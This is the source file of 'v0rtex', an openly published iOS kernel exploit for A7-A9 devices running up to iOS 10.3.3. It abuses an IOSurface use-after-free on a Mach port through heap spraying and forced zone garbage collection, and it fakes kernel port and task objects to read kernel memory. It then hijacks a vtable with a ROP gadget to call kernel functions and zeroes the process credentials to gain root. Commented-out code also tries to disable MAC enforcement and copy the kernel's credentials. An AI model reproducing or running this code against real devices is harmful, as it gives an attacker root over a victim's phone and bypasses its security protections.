// v0rtex
// Bug by Ian Beer, I suppose?
// Exploit by Siguza.

// Status quo:
// - Gets root, should work on A7-A9 devices <=10.3.3.
// - Can call arbitrary kernel functions with up to 7 args via KCALL().
// - Relies heavily on userland derefs, but with mach_port_request_notification
//   you could register fakeport on itself thus leaking the address of the
//   entire 0x1000 block, which should give you enough scratch space. (TODO)
// - Relies on mach_zone_force_gc which was removed in iOS 11, but the same
//   effect should be achievable by continuously spraying through zones and
//   measuring how long it takes - garbag collection usually takes ages. :P
// - Doesn't manage a sandbox escape yet, kernel creds seem to be insufficient.
// - kauth_cred_ref panics on me with the kernel creds, no idea why.
// - Task termination causes a panic despite attempted cleanup, haven't
//   investigated that yet.
// - Very much TODO: tfp0

// Not sure what'll really become of this, but it's certainly not done yet.
// Pretty sure I'll leave iOS 11 to Ian Beer though, for the time being.
// Might also do a write-up at some point, once fully working.

#include <sched.h>              // sched_yield
#include <unistd.h>             // usleep, setuid, getuid
#include <mach/mach.h>
#include <Foundation/Foundation.h>
#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOKitLib.h>

#define LOG(str, args...) do { NSLog(@str "\n", ##args); } while(0)

#define OFFSET_TASK_ITK_SELF                        0xd8
#define OFFSET_TASK_ITK_REGISTERED                  0x2e8
#define OFFSET_TASK_BSD_INFO                        0x360
#define OFFSET_PROC_P_PID                           0x10
#define OFFSET_PROC_UCRED                           0x100
#define OFFSET_UCRED_CR_UID                         0x18
#define OFFSET_UCRED_CR_FLAGS                       0x74
#define OFFSET_UCRED_CR_LABEL                       0x78
#define OFFSET_IPC_SPACE_IS_TASK                    0x28
#define OFFSET_IOUSERCLIENT_IPC                     0x9c
#define OFFSET_VTAB_GET_EXTERNAL_TRAP_FOR_INDEX     0x5b8

#define OFFSET_KERNPROC                             0xfffffff0075b40c8
#define OFFSET_BZERO                                0xfffffff00708df80
#define OFFSET_MEMCPY                               0xfffffff00708ddd0
#define OFFSET_KAUTH_CRED_REF                       0xfffffff007374d90
#define OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         0xfffffff006ef2d78
#define OFFSET_ROP_ADD_X0_X0_8                      0xfffffff0067290a8

const uint64_t IOSURFACE_CREATE_SURFACE =  0;
const uint64_t IOSURFACE_SET_VALUE      =  9;
const uint64_t IOSURFACE_GET_VALUE      = 10;
const uint64_t IOSURFACE_DELETE_VALUE   = 11;

const uint32_t CRF_MAC_ENFORCE          = 2;

enum
{
    kOSSerializeDictionary      = 0x01000000U,
    kOSSerializeArray           = 0x02000000U,
    kOSSerializeSet             = 0x03000000U,
    kOSSerializeNumber          = 0x04000000U,
    kOSSerializeSymbol          = 0x08000000U,
    kOSSerializeString          = 0x09000000U,
    kOSSerializeData            = 0x0a000000U,
    kOSSerializeBoolean         = 0x0b000000U,
    kOSSerializeObject          = 0x0c000000U,

    kOSSerializeTypeMask        = 0x7F000000U,
    kOSSerializeDataMask        = 0x00FFFFFFU,

    kOSSerializeEndCollection   = 0x80000000U,

    kOSSerializeMagic           = 0x000000d3U,
};

static uint32_t transpose(uint32_t val)
{
    uint32_t ret = 0;
    for(size_t i = 0; val > 0; i += 8)
    {
        ret += (val % 255) << i;
        val /= 255;
    }
    return ret + 0x01010101;
}

static kern_return_t my_mach_zone_force_gc(host_t host)
{
#pragma pack(4)
    typedef struct {
        mach_msg_header_t Head;
    } Request __attribute__((unused));
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        kern_return_t RetCode;
        mach_msg_trailer_t trailer;
    } Reply __attribute__((unused));
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        kern_return_t RetCode;
    } __Reply __attribute__((unused));
#pragma pack()

    union {
        Request In;
        Reply Out;
    } Mess;

    Request *InP = &Mess.In;
    Reply *Out0P = &Mess.Out;

    InP->Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    InP->Head.msgh_remote_port = host;
    InP->Head.msgh_local_port = mig_get_reply_port();
    InP->Head.msgh_id = 221;
    InP->Head.msgh_reserved = 0;

    kern_return_t ret = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if(ret == KERN_SUCCESS)
    {
        ret = Out0P->RetCode;
    }
    return ret;
}

static kern_return_t my_mach_port_get_context(task_t task, mach_port_name_t name, mach_vm_address_t *context)
{
#pragma pack(4)
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        mach_port_name_t name;
    } Request __attribute__((unused));
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        kern_return_t RetCode;
        mach_vm_address_t context;
        mach_msg_trailer_t trailer;
    } Reply __attribute__((unused));
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        kern_return_t RetCode;
        mach_vm_address_t context;
    } __Reply __attribute__((unused));
#pragma pack()

    union {
        Request In;
        Reply Out;
    } Mess;

    Request *InP = &Mess.In;
    Reply *Out0P = &Mess.Out;

    InP->NDR = NDR_record;
    InP->name = name;
    InP->Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    InP->Head.msgh_remote_port = task;
    InP->Head.msgh_local_port = mig_get_reply_port();
    InP->Head.msgh_id = 3228;
    InP->Head.msgh_reserved = 0;

    kern_return_t ret = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if(ret == KERN_SUCCESS)
    {
        ret = Out0P->RetCode;
    }
    if(ret == KERN_SUCCESS)
    {
        *context = Out0P->context;
    }
    return ret;
}

typedef uint64_t kptr_t;

typedef struct {
    uint32_t ip_bits;
    uint32_t ip_references;
    struct {
        kptr_t data;
        uint32_t type;
        uint32_t pad;
    } ip_lock; // spinlock
    struct {
        struct {
            struct {
                uint32_t flags;
                uint32_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct {
                    kptr_t next;
                    kptr_t prev;
                } waitq_queue;
            } waitq;
            kptr_t messages;
            natural_t seqno;
            natural_t receiver_name;
            uint16_t msgcount;
            uint16_t qlimit;
            uint32_t pad;
        } port;
        kptr_t klist;
    } ip_messages;
    kptr_t ip_receiver;
    kptr_t ip_kobject;
    kptr_t ip_nsrequest;
    kptr_t ip_pdrequest;
    kptr_t ip_requests;
    kptr_t ip_premsg;
    uint64_t  ip_context;
    natural_t ip_flags;
    natural_t ip_mscount;
    natural_t ip_srights;
    natural_t ip_sorights;
} kport_t;

typedef union
{
    struct {
        struct {
            uintptr_t data;
            uint64_t pad      : 24,
                     type     :  8,
                     reserved : 32;
        } lock; // mutex lock
        uint32_t ref_count;
    } a;
    struct {
        char pad[OFFSET_TASK_ITK_SELF];
        kptr_t itk_self;
    } b;
    struct {
        char pad[OFFSET_TASK_ITK_REGISTERED];
        kptr_t itk_registered[3];
    } c;
    struct {
        char pad[OFFSET_TASK_BSD_INFO];
        kptr_t bsd_info;
    } d;
} ktask_t;

kern_return_t v0rtex(void)
{
    kern_return_t ret = KERN_FAILURE;
    task_t self = mach_task_self();

    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    LOG("service: %x", service);
    if(!MACH_PORT_VALID(service))
    {
        goto out0;
    }

    io_connect_t client = MACH_PORT_NULL;
    ret = IOServiceOpen(service, self, 0, &client);
    LOG("client: %x, %s", client, mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out0;
    }
    if(!MACH_PORT_VALID(client))
    {
        ret = KERN_FAILURE;
        goto out0;
    }

    uint32_t dict_create[] =
    {
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeDictionary | 1,

        kOSSerializeSymbol | 19,
        0x75534f49, 0x63616672, 0x6c6c4165, 0x6953636f, 0x657a, // "IOSurfaceAllocSize"
        kOSSerializeEndCollection | kOSSerializeNumber | 32,
        0x1000,
        0x0,
    };
    union
    {
        char _padding[0x3c8]; // XXX 0x6c8 for iOS 11
        struct
        {
            mach_vm_address_t addr1;
            mach_vm_address_t addr2;
            uint32_t id;
        } data;
    } surface;
    size_t size = sizeof(surface);
    ret = IOConnectCallStructMethod(client, IOSURFACE_CREATE_SURFACE, dict_create, sizeof(dict_create), &surface, &size);
    LOG("newSurface: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out1;
    }

    mach_port_t realport = MACH_PORT_NULL;
    ret = mach_port_allocate(self, MACH_PORT_RIGHT_RECEIVE, &realport);
    if(ret != KERN_SUCCESS)
    {
        LOG("mach_port_allocate: %s", mach_error_string(ret));
        goto out1;
    }
    if(!MACH_PORT_VALID(realport))
    {
        LOG("realport: %x", realport);
        ret = KERN_FAILURE;
        goto out1;
    }

#define NUM_BEFORE 0x1000
    mach_port_t before[NUM_BEFORE] = { MACH_PORT_NULL };
    for(size_t i = 0; i < NUM_BEFORE; ++i)
    {
        ret = mach_port_allocate(self, MACH_PORT_RIGHT_RECEIVE, &before[i]);
        if(ret != KERN_SUCCESS)
        {
            LOG("mach_port_allocate: %s", mach_error_string(ret));
            goto out2;
        }
    }

    mach_port_t port = MACH_PORT_NULL;
    ret = mach_port_allocate(self, MACH_PORT_RIGHT_RECEIVE, &port);
    if(ret != KERN_SUCCESS)
    {
        LOG("mach_port_allocate: %s", mach_error_string(ret));
        goto out2;
    }
    if(!MACH_PORT_VALID(port))
    {
        LOG("port: %x", port);
        ret = KERN_FAILURE;
        goto out2;
    }

#define NUM_AFTER 0x100
    mach_port_t after[NUM_AFTER] = { MACH_PORT_NULL };
    for(size_t i = 0; i < NUM_AFTER; ++i)
    {
        ret = mach_port_allocate(self, MACH_PORT_RIGHT_RECEIVE, &after[i]);
        if(ret != KERN_SUCCESS)
        {
            LOG("mach_port_allocate: %s", mach_error_string(ret));
            goto out3;
        }
    }

    LOG("realport: %x", realport);
    LOG("port: %x", port);

    ret = mach_port_insert_right(self, port, port, MACH_MSG_TYPE_MAKE_SEND);
    LOG("mach_port_insert_right: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out3;
    }

    // There seems to be some weird asynchronity with freeing on IOConnectCallAsyncStructMethod,
    // which sucks. To work around it, I register the port to be freed on my own task (thus increasing refs),
    // sleep() after the connect call and register again, thus releasing the reference synchronously.
    ret = mach_ports_register(self, &port, 1);
    LOG("mach_ports_register: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out3;
    }

    uint64_t ref;
    uint64_t in[3] = { 0, 0x666, 0 };
    IOConnectCallAsyncStructMethod(client, 17, realport, &ref, 1, in, sizeof(in), NULL, NULL);
    IOConnectCallAsyncStructMethod(client, 17, port, &ref, 1, in, sizeof(in), NULL, NULL);

    LOG("herp derp");
    usleep(100000);

    sched_yield();
    ret = mach_ports_register(self, &client, 1); // gonna use that later
    LOG("mach_ports_register: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out3;
    }

    // Prevent cleanup
    mach_port_t fakeport = port;
    port = MACH_PORT_NULL;

    // Heapcraft
    for(size_t i = NUM_AFTER; i > 0; --i)
    {
        if(MACH_PORT_VALID(after[i - 1]))
        {
            mach_port_destroy(self, after[i - 1]);
            after[i - 1] = MACH_PORT_NULL;
        }
    }
    for(size_t i = NUM_BEFORE; i > 0; --i)
    {
        if(MACH_PORT_VALID(before[i - 1]))
        {
            mach_port_destroy(self, before[i - 1]);
            before[i - 1] = MACH_PORT_NULL;
        }
    }

#define DATA_SIZE 0x1000
    uint32_t dict[DATA_SIZE / sizeof(uint32_t) + 7] =
    {
        // Some header or something
        surface.data.id,
        0x0,

        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeArray | 2,

        kOSSerializeString | (DATA_SIZE - 1),
    };
    dict[DATA_SIZE / sizeof(uint32_t) + 5] = kOSSerializeEndCollection | kOSSerializeString | 4;

    // ipc.ports zone uses 0x3000 allocation chunks, but hardware page size before A9
    // is actually 0x1000, so references to our reallocated memory may be shifted
    // by (0x1000 % sizeof(kport_t))
    kport_t triple_kport =
    {
        .ip_lock =
        {
            .data = 0x0,
            .type = 0x11,
        },
        .ip_messages =
        {
            .port =
            {
                .waitq =
                {
                    .waitq_queue =
                    {
                        .next = 0x0,
                        .prev = 0x11,
                    }
                },
            },
        },
        .ip_nsrequest = 0x0,
        .ip_pdrequest = 0x11,
    };
    for(uintptr_t ptr = (uintptr_t)&dict[5], end = (uintptr_t)&dict[5] + DATA_SIZE; ptr + sizeof(kport_t) <= end; ptr += sizeof(kport_t))
    {
        *(volatile kport_t*)ptr = triple_kport;
    }

    sched_yield();
    ret = my_mach_zone_force_gc(mach_host_self());
    LOG("mach_zone_force_gc: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out3;
    }

    for(uint32_t i = 0; i < 0x2000; ++i)
    {
        dict[DATA_SIZE / sizeof(uint32_t) + 6] = transpose(i);
        volatile kport_t *dptr = (kport_t*)&dict[5];
        for(size_t j = 0; j < DATA_SIZE / sizeof(kport_t); ++j)
        {
            dptr[j].ip_context = (dptr[j].ip_context & 0xffffffff) | ((uint64_t)(0x10000000 | i) << 32);
            dptr[j].ip_messages.port.pad = 0x20000000 | i;
            dptr[j].ip_lock.pad = 0x30000000 | i;
        }
        uint32_t dummy;
        size = sizeof(dummy);
        ret = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, dict, sizeof(dict), &dummy, &size);
        if(ret != KERN_SUCCESS)
        {
            LOG("setValue(%u): %s", i, mach_error_string(ret));
            goto out3;
        }
    }

    uint64_t ctx = 0xffffffff;
    ret = my_mach_port_get_context(self, fakeport, &ctx);
    LOG("mach_port_get_context: 0x%llx, %s", ctx, mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out3;
    }

    uint32_t shift_mask = ctx >> 60;
    if(shift_mask < 1 || shift_mask > 3)
    {
        LOG("Invalid shift mask.");
        goto out3;
    }
    uint32_t shift_off = sizeof(kport_t) - (((shift_mask - 1) * 0x1000) % sizeof(kport_t));

    uint32_t idx = (ctx >> 32) & 0xfffffff;
    dict[DATA_SIZE / sizeof(uint32_t) + 6] = transpose(idx);
    uint32_t request[] =
    {
        // Same header
        surface.data.id,
        0x0,

        transpose(idx), // Key
        0x0, // Null terminator
    };
    kport_t kport =
    {
        .ip_bits = 0x80000000, // IO_BITS_ACTIVE | IOT_PORT | IKOT_NONE
        .ip_references = 100,
        .ip_lock =
        {
            .type = 0x11,
        },
        .ip_messages =
        {
            .port =
            {
                .receiver_name = 1,
                .msgcount = MACH_PORT_QLIMIT_KERNEL,
                .qlimit = MACH_PORT_QLIMIT_KERNEL,
            },
        },
        .ip_receiver = 0x12345678, // dummy
        .ip_srights = 99,
    };

    for(uintptr_t ptr = (uintptr_t)&dict[5] + shift_off, end = (uintptr_t)&dict[5] + DATA_SIZE; ptr + sizeof(kport_t) <= end; ptr += sizeof(kport_t))
    {
        *(volatile kport_t*)ptr = kport;
    }
    uint32_t dummy;
    size = sizeof(dummy);

    sched_yield();
    ret = IOConnectCallStructMethod(client, 11, request, sizeof(request), &dummy, &size);
    if(ret != KERN_SUCCESS)
    {
        LOG("deleteValue(%u): %s", idx, mach_error_string(ret));
        goto out3;
    }
    size = sizeof(dummy);
    ret = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, dict, sizeof(dict), &dummy, &size);
    LOG("setValue(%u): %s", idx, mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out3;
    }

    mach_port_t notify = MACH_PORT_NULL;
    ret = mach_port_request_notification(self, fakeport, MACH_NOTIFY_PORT_DESTROYED, 0, realport, MACH_MSG_TYPE_MAKE_SEND_ONCE, &notify);
    LOG("mach_port_request_notification: %x, %s", notify, mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out3;
    }

    uint32_t response[4 + (DATA_SIZE / sizeof(uint32_t))] = { 0 };
    size = sizeof(response);
    ret = IOConnectCallStructMethod(client, IOSURFACE_GET_VALUE, request, sizeof(request), response, &size);
    LOG("getValue(%u): 0x%lx bytes, %s", idx, size, mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out3;
    }
    if(size < DATA_SIZE + 0x10)
    {
        LOG("Response too short.");
        goto out3;
    }

    uint32_t fakeport_off = -1;
    kptr_t realport_addr = 0;
    for(uintptr_t ptr = (uintptr_t)&response[4] + shift_off, end = (uintptr_t)&response[4] + DATA_SIZE; ptr + sizeof(kport_t) <= end; ptr += sizeof(kport_t))
    {
        kptr_t val = ((volatile kport_t*)ptr)->ip_pdrequest;
        if(val)
        {
            fakeport_off = ptr - (uintptr_t)&response[4];
            realport_addr = val;
            break;
        }
    }
    if(!realport_addr)
    {
        LOG("Failed to leak realport pointer");
        goto out3;
    }
    LOG("realport addr: 0x%llx", realport_addr);

    ktask_t ktask;
    ktask.a.lock.data = 0x0;
    ktask.a.lock.type = 0x22;
    ktask.a.ref_count = 100;
    ktask.b.itk_self = 1;
    ktask.c.itk_registered[0] = 0;
    ktask.c.itk_registered[1] = 0;
    ktask.c.itk_registered[2] = 0;
    ktask.d.bsd_info = 0;

    kport.ip_bits = 0x80000002; // IO_BITS_ACTIVE | IOT_PORT | IKOT_TASK
    kport.ip_kobject = (kptr_t)&ktask;

    for(uintptr_t ptr = (uintptr_t)&dict[5] + shift_off, end = (uintptr_t)&dict[5] + DATA_SIZE; ptr + sizeof(kport_t) <= end; ptr += sizeof(kport_t))
    {
        *(volatile kport_t*)ptr = kport;
    }
    size = sizeof(dummy);

    sched_yield();
    ret = IOConnectCallStructMethod(client, 11, request, sizeof(request), &dummy, &size);
    if(ret != KERN_SUCCESS)
    {
        LOG("deleteValue(%u): %s", idx, mach_error_string(ret));
        goto out3;
    }
    size = sizeof(dummy);
    ret = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, dict, sizeof(dict), &dummy, &size);
    LOG("setValue(%u): %s", idx, mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out3;
    }

#define KREAD(addr, buf, size) \
do \
{ \
    for(size_t i = 0; i < ((size) + sizeof(uint32_t) - 1) / sizeof(uint32_t); ++i) \
    { \
        ktask.d.bsd_info = (addr + i * sizeof(uint32_t)) - OFFSET_PROC_P_PID; \
        ret = pid_for_task(fakeport, (int*)((uint32_t*)(buf) + i)); \
        if(ret != KERN_SUCCESS) \
        { \
            LOG("pid_for_task: %s", mach_error_string(ret)); \
            goto out3; \
        } \
    } \
} while(0)
    kptr_t itk_space = 0;
    KREAD(realport_addr + ((uintptr_t)&kport.ip_receiver - (uintptr_t)&kport), &itk_space, sizeof(itk_space));
    LOG("itk_space: 0x%llx", itk_space);

    kptr_t is_task = 0;
    KREAD(itk_space + OFFSET_IPC_SPACE_IS_TASK, &is_task, sizeof(is_task));
    LOG("is_task: 0x%llx", is_task);

    kptr_t self_proc = 0;
    KREAD(is_task + OFFSET_TASK_BSD_INFO, &self_proc, sizeof(self_proc));
    LOG("self_proc: 0x%llx", self_proc);

    kptr_t self_ucred = 0;
    KREAD(self_proc + OFFSET_PROC_UCRED, &self_ucred, sizeof(self_ucred));
    LOG("self_ucred: 0x%llx", self_ucred);

    /*int cr_flags = 0;
    KREAD(self_ucred + OFFSET_UCRED_CR_FLAGS, &cr_flags, sizeof(cr_flags));
    LOG("cr_flags: 0x%x", cr_flags);*/

    kptr_t IOSurfaceRootUserClient_port = 0;
    KREAD(is_task + OFFSET_TASK_ITK_REGISTERED, &IOSurfaceRootUserClient_port, sizeof(IOSurfaceRootUserClient_port));
    LOG("IOSurfaceRootUserClient port: 0x%llx", IOSurfaceRootUserClient_port);

    kptr_t IOSurfaceRootUserClient_addr = 0;
    KREAD(IOSurfaceRootUserClient_port + ((uintptr_t)&kport.ip_kobject - (uintptr_t)&kport), &IOSurfaceRootUserClient_addr, sizeof(IOSurfaceRootUserClient_addr));
    LOG("IOSurfaceRootUserClient addr: 0x%llx", IOSurfaceRootUserClient_addr);

    kptr_t IOSurfaceRootUserClient_vtab = 0;
    KREAD(IOSurfaceRootUserClient_addr, &IOSurfaceRootUserClient_vtab, sizeof(IOSurfaceRootUserClient_vtab));
    LOG("IOSurfaceRootUserClient vtab: 0x%llx", IOSurfaceRootUserClient_vtab);

    kptr_t slide = IOSurfaceRootUserClient_vtab - OFFSET_IOSURFACEROOTUSERCLIENT_VTAB;
    LOG("slide: 0x%llx", slide);
    if((slide % 0x100000) != 0)
    {
        goto out3;
    }

    /*kptr_t kernproc = 0;
    KREAD(OFFSET_KERNPROC + slide, &kernproc, sizeof(kernproc));
    LOG("kernproc: 0x%llx", kernproc);

    kptr_t kern_ucred = 0;
    KREAD(kernproc + OFFSET_PROC_UCRED, &kern_ucred, sizeof(kern_ucred));
    LOG("kern_ucred: 0x%llx", kern_ucred);*/

    kptr_t vtab[0x600 / sizeof(kptr_t)] = { 0 };
    KREAD(IOSurfaceRootUserClient_vtab, vtab, sizeof(vtab));
    vtab[OFFSET_VTAB_GET_EXTERNAL_TRAP_FOR_INDEX / sizeof(kptr_t)] = OFFSET_ROP_ADD_X0_X0_8 + slide;
    union
    {
        struct {
            kptr_t vtab;
            kptr_t obj;
            kptr_t func;
        } a;
        struct {
            char pad[OFFSET_IOUSERCLIENT_IPC];
            int32_t __ipc;
        } b;
    } object;
    object.a.vtab = (kptr_t)&vtab;
    object.b.__ipc = 100;

    kport.ip_bits = 0x8000001d; // IO_BITS_ACTIVE | IOT_PORT | IKOT_IOKIT_CONNECT
    kport.ip_kobject = (kptr_t)&object;

    for(uintptr_t ptr = (uintptr_t)&dict[5] + shift_off, end = (uintptr_t)&dict[5] + DATA_SIZE; ptr + sizeof(kport_t) <= end; ptr += sizeof(kport_t))
    {
        *(volatile kport_t*)ptr = kport;
    }
    size = sizeof(dummy);

    // we leak a ref on realport here
    sched_yield();
    ret = IOConnectCallStructMethod(client, 11, request, sizeof(request), &dummy, &size);
    if(ret != KERN_SUCCESS)
    {
        LOG("deleteValue(%u): %s", idx, mach_error_string(ret));
        goto out3;
    }
    size = sizeof(dummy);
    ret = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, dict, sizeof(dict), &dummy, &size);
    LOG("setValue(%u): %s", idx, mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out3;
    }

    usleep(100000); // XXX

#define KCALL(addr, x0, x1, x2, x3, x4, x5, x6) \
( \
    object.a.obj = (kptr_t)(x0), \
    object.a.func = (kptr_t)(addr), \
    (kptr_t)IOConnectTrap6(fakeport, 0, (kptr_t)(x1), (kptr_t)(x2), (kptr_t)(x3), (kptr_t)(x4), (kptr_t)(x5), (kptr_t)(x6)) \
)
    KCALL(OFFSET_BZERO + slide, self_ucred + OFFSET_UCRED_CR_UID, sizeof(uint32_t) * 3, 0, 0, 0, 0, 0);
    LOG("uid: %u", getuid());

    /*cr_flags &= ~CRF_MAC_ENFORCE;
    KCALL(OFFSET_MEMCPY + slide, self_ucred + OFFSET_UCRED_CR_FLAGS, &cr_flags, sizeof(cr_flags), 0, 0, 0, 0);
    LOG("set cr_flags");

    KCALL(OFFSET_MEMCPY + slide, self_ucred + OFFSET_UCRED_CR_LABEL, kern_ucred + OFFSET_UCRED_CR_LABEL, sizeof(kptr_t), 0, 0, 0, 0);
    LOG("set cr_label");*/

    //KCALL(OFFSET_KAUTH_CRED_REF + slide, kern_ucred, 0, 0, 0, 0, 0, 0);
    //KCALL(OFFSET_MEMCPY + slide, self_proc + OFFSET_PROC_UCRED, kernproc + OFFSET_PROC_UCRED, 0, 0, 0, 0, 0);
    //LOG("Snatched the kernel's creds");

    usleep(100000); // XXX

    setuid(0); // update host port

    // Cleanup
    ret = mach_ports_register(self, &fakeport, 1);
    LOG("mach_ports_register: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out3;
    }
    KCALL(OFFSET_MEMCPY + slide, is_task + OFFSET_TASK_ITK_REGISTERED, &realport_addr, sizeof(realport_addr), 0, 0, 0, 0); // Fix the ref we leaked earlier
    mach_port_destroy(self, fakeport);

    usleep(100000); // XXX

    FILE *f = fopen("/var/mobile/test.txt", "w");
    LOG("file: %p", f);

    ret = KERN_SUCCESS;
out3:;
    for(size_t i = 0; i < NUM_AFTER; ++i)
    {
        if(MACH_PORT_VALID(after[i]))
        {
            mach_port_destroy(self, after[i]);
            after[i] = MACH_PORT_NULL;
        }
    }
    if(MACH_PORT_VALID(port))
    {
        mach_port_destroy(self, port);
        port = MACH_PORT_NULL;
    }
out2:;
    for(size_t i = 0; i < NUM_BEFORE; ++i)
    {
        if(MACH_PORT_VALID(before[i]))
        {
            mach_port_destroy(self, before[i]);
            before[i] = MACH_PORT_NULL;
        }
    }
    if(MACH_PORT_VALID(realport))
    {
        mach_port_destroy(self, realport);
        realport = MACH_PORT_NULL;
    }
out1:;
    IOServiceClose(client);
out0:;
    return ret;
}
